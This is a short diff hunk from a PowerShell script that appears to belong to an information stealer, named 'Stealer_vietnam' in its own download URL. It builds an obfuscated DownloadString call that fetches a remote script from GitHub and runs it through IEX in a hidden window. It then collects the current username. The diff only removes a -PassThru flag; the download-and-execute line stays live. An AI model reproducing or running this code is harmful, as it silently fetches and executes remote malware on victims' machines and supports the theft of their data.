@@ -1,6 +1,6 @@
 $skibiditoilet = ("https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/taskkill.ps1")
 $dopdopyesyes = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$skibiditoilet')"
-Start-Process "powershell" -Argument "IEX($dopdopyesyes)" -PassThru -WindowStyle Hidden
+Start-Process "powershell" -Argument "IEX($dopdopyesyes)" -WindowStyle Hidden
 
 # Lấy thông tin User
 $user = $env:username
